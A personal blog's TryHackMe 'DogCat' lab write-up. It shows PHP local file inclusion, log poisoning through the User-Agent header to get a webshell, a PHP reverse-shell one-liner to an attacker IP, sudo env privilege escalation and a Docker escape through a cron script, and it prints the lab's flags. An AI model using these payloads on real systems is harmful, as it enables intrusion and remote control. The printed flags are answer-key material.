<!DOCTYPE html>
<html lang="en">
  <head>
    <title>
        TryHackMe - DogCat Writeup - A personal cybersecurity blog
      </title>
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    
    <meta name="theme-color" content="#000000" />
    <meta http-equiv="window-target" content="_top" />
    
    
    <meta name="description" content="topics: php, lfi, rce, docker, cron" />
    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
    <title>TryHackMe - DogCat Writeup - A personal cybersecurity blog</title>
    
    
    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
    <meta property="og:title" content="TryHackMe - DogCat Writeup" />
<meta property="og:description" content="topics: php, lfi, rce, docker, cron" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" />
<meta property="og:image" content="/shortcode" />
<meta property="og:image" content="/" />
<meta property="article:published_time" content="2020-05-12T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-05-12T00:00:00+00:00" />

<meta itemprop="name" content="TryHackMe - DogCat Writeup">
<meta itemprop="description" content="topics: php, lfi, rce, docker, cron">
<meta itemprop="datePublished" content="2020-05-12T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2020-05-12T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="965">
<meta itemprop="image" content="/shortcode">
<meta itemprop="image" content="/">



<meta itemprop="keywords" content="php,lfi,docker,cron,rce," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/shortcode"/>

<meta name="twitter:title" content="TryHackMe - DogCat Writeup"/>
<meta name="twitter:description" content="topics: php, lfi, rce, docker, cron"/>

    <!--[if lte IE 9]>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
      <![endif]-->

    <!--[if lt IE 9]>
        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
      <![endif]-->

  </head>

  
  

  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="slimContent">
      <div class="navbar-header">
        <div class="profile-block text-center">
          <a id="avatar" href="/">
            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
          </a>
          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
        </div><div class="search" id="search-form-wrap">
    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
                        class="icon icon-search"></i></button>
            </span>
        </div>
        <div class="ins-search">
            <div class="ins-search-mask"></div>
            <div class="ins-search-container">
                <div class="ins-input-wrapper">
                    <input type="text" class="ins-search-input" placeholder="Type something..."
                        x-webkit-speech />
                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
                        aria-label="Close"><span aria-hidden="true">Ã—</span></button>
                </div>
                <div class="ins-section-wrapper">
                    <div class="ins-section-container"></div>
                </div>
            </div>
        </div>
    </form>
</div>

        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>
      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
        <ul class="nav navbar-nav main-nav">
            <li class="menu-item menu-item-home">
                <a href="/">
                    <i class="icon icon-home-fill"></i>
                  <span class="menu-title">Home</span>
                </a>
            </li>
            <li class="menu-item menu-item-archives">
                <a href="/posts/">
                    <i class="icon icon-archives-fill"></i>
                  <span class="menu-title">Posts</span>
                </a>
            </li>
            <li class="menu-item menu-item-books">
                <a href="/categories/">
                    <i class="icon icon-book-fill"></i>
                  <span class="menu-title">Writeups</span>
                </a>
            </li>
            <li class="menu-item menu-item-tags">
                <a href="/tags/">
                    <i class="icon icon-tags"></i>
                  <span class="menu-title">Tags</span>
                </a>
            </li>
            <li class="menu-item menu-item-about">
                <a href="/about/">
                    <i class="icon icon-cup-fill"></i>
                  <span class="menu-title">About</span>
                </a>
            </li>
        </ul>
      </nav>
    </div>
  </header>

<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <div class="widget">
  <h3 class="widget-title"><u> Categories</u></h3>
    <div class="widget-body">
        <ul class="category-list">
            <li class="category-list-item"><a href="/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">5</span></li>
            <li class="category-list-item"><a href="/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">3</span></li>
        </ul>
    </div>
</div>
<div class="widget">
  <h3 class="widget-title"><u> Tags </u></h3>
    <div class="widget-body">
        <ul class="tag-list">
            
            
            <a href="/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">3</span>
            
            
            <a href="/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
            
        </ul>

    </div>
</div>

<div class="widget">
  <h3 class="widget-title"><u> Recent Posts </u></h3>
    <div class="widget-body">
        <ul class="recent-post-list list-unstyled no-thumbnail">
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/" class="title">TryHackMe - UltraTech Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-16 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-16</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="title">TryHackMe - DogCat Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
                    </p>
                </div>
            </li>
        </ul>
    </div>
</div>

  </div>
</aside>

    
    
<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <h4 class="toc-title">Table of Contents</h4>
    <nav id="toc" class="js-toc toc">

    </nav>
  </div>
</aside>

<main class="main" role="main"><div class="content">
  <article id="-" class="article article-type-" itemscope
    itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      <h3 itemprop="name">
  <a
    class="article-title"
    href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/"
    >TryHackMe - DogCat Writeup</a
  >
</h3>

      <div class="article-meta">
        
<span class="article-date">
  <i class="icon icon-calendar-check"></i>&nbsp;
<a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="article-date">
  <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
</a>
</span>
<span class="article-category">
  <i class="icon icon-folder"></i>&nbsp;
  <a class="article-category-link" href="/categories/tryhackme-writeups/"> TryHackMe writeups </a>
</span>  
  <span class="article-tag">
    <i class="icon icon-tags"></i>&nbsp;
    <a class="article-tag-link" href="/tags/php/"> php </a>
    <a class="article-tag-link" href="/tags/lfi/"> lfi </a>
    <a class="article-tag-link" href="/tags/docker/"> docker </a>
    <a class="article-tag-link" href="/tags/cron/"> cron </a>
    <a class="article-tag-link" href="/tags/rce/"> rce </a>
  </span>
<br>
        
        
        
      </div>
    </div>
    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
      <h2 id="nmap-scan">Nmap scan</h2>
<hr>
<pre><code class="language-shell:#" data-lang="shell:#">nmap -sC -sV -oN nmap.out 10.10.174.171
</code></pre><p>Open ports:</p>
<ul>
<li>22 - SSH</li>
<li>80- http</li>
</ul>
<p>We have a look at the webpage where it lets us view some dot or cat pictures</p>
<p><img src="/img/tryhackme_dogcat/1.png" alt=""></p>
<p>Having a look at the url, we see that the page is running a php that shows the
pictures stored in the dogs/ or cats/ folder which passes the value &ldquo;dog&rdquo; or
&ldquo;cat&rdquo; to the variable &ldquo;view&rdquo;.</p>
<p>We try some basic LFI here to chech if we can view the /etc/passwd for example
with the req url as:
<code>http://10.10.174.171/?view=../../../../../../../etc/passwd</code></p>
<p>But it fails showing that only dogs or cats are allowed.</p>
<p><img src="/img/tryhackme_dogcat/2.png" alt=""></p>
<p>So it checks for a string dog or cat in the provided value of view. We try
adding &ldquo;dog&rdquo; after a null byte %00 so that it passes the string check but is
not evaluated when showing the file. We get the following:</p>
<p><img src="/img/tryhackme_dogcat/3.png" alt=""></p>
<p>We see that we do bypass the string check but it fails to open a the file.</p>
<p>Accidentally passing dogs to the view variable, we find that the script also
adds the extension .php to the end of the file to be viewed passed in the view
variable</p>
<p><img src="/img/tryhackme_dogcat/4.png" alt=""></p>
<h2 id="local-file-inclusion">Local File Inclusion</h2>
<hr>
<p>Googling a bit, we find a new php LFI technique found <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">here</a>.</p>
<p>I originally found it in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">payloadsallthethings</a> which is a great source for pentesters.</p>
<p>We use the technique to get our base64 encoded php source of dog.php and decode
it to view the source.</p>
<p><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog</code></p>
<p><img src="/img/tryhackme_dogcat/5.png" alt=""></p>
<p><img src="/img/tryhackme_dogcat/6.png" alt=""></p>
<p>Now we see that we can also check the source of the index.php file using
directroy traversal in the same way</p>
<p><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index</code></p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-index.php" data-lang="index.php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">&lt;!DOCCTYPE HTML&gt;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>&lt;<span style="color:#5bc4bf">html</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>&lt;<span style="color:#5bc4bf">head</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    &lt;<span style="color:#5bc4bf">title</span>&gt;dogcat&lt;/<span style="color:#5bc4bf">title</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    &lt;<span style="color:#5bc4bf">link</span> <span style="color:#06b6ef">rel</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;stylesheet&#34;</span> <span style="color:#06b6ef">type</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;text/css&#34;</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;/style.css&#34;</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>&lt;/<span style="color:#5bc4bf">head</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>&lt;<span style="color:#5bc4bf">body</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    &lt;<span style="color:#5bc4bf">h1</span>&gt;dogcat&lt;/<span style="color:#5bc4bf">h1</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    &lt;<span style="color:#5bc4bf">i</span>&gt;a gallery of various dogs or cats&lt;/<span style="color:#5bc4bf">i</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    &lt;<span style="color:#5bc4bf">div</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>        &lt;<span style="color:#5bc4bf">h2</span>&gt;What would you like to see?&lt;/<span style="color:#5bc4bf">h2</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>        &lt;<span style="color:#5bc4bf">a</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;/?view=dog&#34;</span>&gt;&lt;<span style="color:#5bc4bf">button</span> <span style="color:#06b6ef">id</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;dog&#34;</span>&gt;A dog&lt;/<span style="color:#5bc4bf">button</span>&gt;&lt;/<span style="color:#5bc4bf">a</span>&gt; &lt;<span style="color:#5bc4bf">a</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;/?view=cat&#34;</span>&gt;&lt;<span style="color:#5bc4bf">button</span> <span style="color:#06b6ef">id</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;cat&#34;</span>&gt;A cat&lt;/<span style="color:#5bc4bf">button</span>&gt;&lt;/<span style="color:#5bc4bf">a</span>&gt;&lt;<span style="color:#5bc4bf">br</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>        <span style="color:#776e71">&lt;?php</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>            <span style="color:#815ba4">function</span> <span style="color:#06b6ef">containsStr</span>(<span style="color:#ef6155">$str</span>, <span style="color:#ef6155">$substr</span>) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>                <span style="color:#815ba4">return</span> <span style="color:#06b6ef">strpos</span>(<span style="color:#ef6155">$str</span>, <span style="color:#ef6155">$substr</span>) <span style="color:#5bc4bf">!==</span> <span style="color:#815ba4">false</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>            }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>            <span style="color:#ef6155">$ext</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#34;ext&#34;</span>]) <span style="color:#5bc4bf">?</span> <span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#34;ext&#34;</span>] <span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#39;.php&#39;</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>            <span style="color:#815ba4">if</span>(<span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#39;view&#39;</span>])) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>                <span style="color:#815ba4">if</span>(<span style="color:#06b6ef">containsStr</span>(<span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#39;view&#39;</span>], <span style="color:#48b685">&#39;dog&#39;</span>) <span style="color:#5bc4bf">||</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span style="color:#06b6ef">containsStr</span>(<span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#39;view&#39;</span>], <span style="color:#48b685">&#39;cat&#39;</span>)) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>                    <span style="color:#815ba4">echo</span> <span style="color:#48b685">&#39;Here you go!&#39;</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>                    <span style="color:#815ba4">include</span> <span style="color:#ef6155">$_GET</span>[<span style="color:#48b685">&#39;view&#39;</span>] <span style="color:#5bc4bf">.</span> <span style="color:#ef6155">$ext</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>                } <span style="color:#815ba4">else</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>                    <span style="color:#815ba4">echo</span> <span style="color:#48b685">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>                }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>            }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>        <span style="color:#776e71">?&gt;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>    &lt;/<span style="color:#5bc4bf">div</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</code></pre></div><p>What&rsquo;s interesting here is that it allows us to pass an &ldquo;ext&rdquo; variable that
contains the file extension. On the variable being unset, it adds the default
extension of .php</p>
<p>So we check now if we can read the /etc/passwd file with the following request
<code>http://10.10.174.171/?view=dog/../../../../etc/passwd&amp;ext=</code></p>
<p>And we see that we can!</p>
<p><img src="/img/tryhackme_dogcat/7.png" alt=""></p>
<p>Now we check if we can find the log file where it logs all our requests. After
fiddling around for a bit, we find the logs in the /var/log/apache2/access.log
finding out that the server is running apache2. And we see our last request
there.</p>
<p><img src="/img/tryhackme_dogcat/8.png" alt=""></p>
<p>We see that the log also saves our user-agent header, in our case, Mozilla
Firefox</p>
<p>So, we check if we can inject some php code into our user-agent header that will
also get executed along with the main php file.</p>
<p>We can do this using burpsuite repeater to test again and again.</p>
<p>We change the header to hello to test and it works</p>
<p><img src="/img/tryhackme_dogcat/9.png" alt=""></p>
<p>Now we test some php commands. First we try the system(&ldquo;<!-- raw HTML omitted -->&rdquo;) which is
suposed to execute the command on the machine and print us the output
<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
<p>But executing this once, we somehow break the machine and cannot access the log
any more
<img src="/img/tryhackme_dogcat/10.png" alt=""></p>
<p>Next we try a webshell like approach that will get a command passed in the
cmd variable and execute it.
<code>system($_GET['cmd']);</code></p>
<p><img src="/img/tryhackme_dogcat/11.png" alt=""></p>
<p>And we have command execution!</p>
<h2 id="user-www-data">User www-data</h2>
<hr>
<p>We try some commands and see that we are www-data, we try getting a reverse
shell using php. The php reverse shell:
<code>php -r '$sock=fsockopen(&quot;10.8.6.75&quot;, 8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
<p>We must url encode the revshell passed in the command. The url encoded request
stands:
<code>10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=php -r '$sock=fsockopen(&quot;10.8.6.75&quot;,1337);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
<p>We start a nc listener on port 1337 and get the reverse shell.</p>
<p><img src="/img/tryhackme_dogcat/12.png" alt=""></p>
<h2 id="flag1">flag1</h2>
<hr>
<p>Right away, we find the flag.php in the current folder. We cat out the contents
to get the flag.</p>
<p><img src="/img/tryhackme_dogcat/13.png" alt=""></p>
<p><strong>flag1=&quot;THM{Th1s_1s_N0t_4_Catdog_ab67edfa}&quot;</strong></p>
<h2 id="flag2">##flag2</h2>
<p>After digging around the files for a bit, we find our second flag in the
/var/www directory.</p>
<p><img src="/img/tryhackme_dogcat/14.png" alt=""></p>
<p><strong>flag2 = THM{LF1_t0_RC3_aec3fb}</strong></p>
<h2 id="privilege-escalation---root">Privilege escalation - Root</h2>
<hr>
<p>Next, we try to escalate our privilege to root. We try some enumeration and
find that our user can execute /usr/bin/env as sudo using the command <code>sudo -l</code></p>
<p><img src="/img/tryhackme_dogcat/15.png" alt=""></p>
<p>We look for privesc using env in <a href="https://gtfobins.github.io/gtfobins/env/#shell">gtfobins</a></p>
<p>We find that a simple <code>env /bin/sh</code> gives us the shell. So we try that.</p>
<p><img src="/img/tryhackme_dogcat/16.png" alt=""></p>
<h2 id="flag3">flag3</h2>
<hr>
<p>And, we have escalated to root successfully. lets look for the remaining
flags.We find our 3rd flag in the /root directory.</p>
<p><img src="/img/tryhackme_dogcat/17.png" alt=""></p>
<p><strong>flag3 = &ldquo;THM{D1ff3r3nt_3nv1ronments_874112}&quot;</strong></p>
<p>The flag tells us something about a different environment.</p>
<p>Looking around for a bit, we find a .dockerenv file in the root directory,
which tells us that we are running inside a docker container.</p>
<p><img src="/img/tryhackme_dogcat/18.png" alt=""></p>
<p>After some looking around, we find an interesting folder in the /opt/backups
directory, having a look at the backup.sh file, we find the following</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-backup.sh" data-lang="backup.sh"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>tar cf /root/container/backup/backup.tar /root/container
</code></pre></div><h2 id="getting-out-of-container">Getting out of container</h2>
<hr>
<p>So the script basically backs up the /root/container to the backup.tar file we
found. It might be running a cron job. We see that we have write permissions to
the file and so, lets try writing a reverse shell into the backup.sh file.</p>
<p><img src="/img/tryhackme_dogcat/19.png" alt=""></p>
<p>We open up a netcat listener on port 8888 and after some time, get a shell back
from root.</p>
<p><img src="/img/tryhackme_dogcat/20.png" alt=""></p>
<h2 id="flag4">flag4</h2>
<hr>
<p>This time, we see that we are on the machine iteself and not inside a docker
container. Going into the root home, /root, we fine our flag4:</p>
<p><img src="/img/tryhackme_dogcat/21.png" alt=""></p>
<p><strong>flag4 = &ldquo;THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}&quot;</strong></p>
<p>New topics learnt:</p>
<ul>
<li>Chech the logs</li>
<li>docker container, cronjob</li>
<li>New php lfi technique</li>
</ul>

    </div>
    <div class="article-footer">
<blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    <li class="post-copyright-link hidden-xs">
      <strong>Permalink: </strong>
      <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" title="TryHackMe - DogCat Writeup" target="_blank" rel="external">/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/</a>
    </li>
    <li class="post-copyright-license">
      <strong>Licenseï¼š</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
    </li>
  </ul>
</blockquote>

<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/avatar.png" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
        <div>Hack the Planet</div>
      </div>
    </figure>
  </div>
</div>

    </div>
  </article>
<section id="comments">
</section>

</div><nav class="bar bar-footer clearfix" data-stick-bottom>
    <div class="bar-inner">
        <ul class="pager pull-left">
            <li class="prev">
                <a href="/writeups/hackthebox-writeups/hackthebox-admirer-writeup/" title="Hackthebox - Admirer Writeup"><i
                        class="icon icon-angle-left"
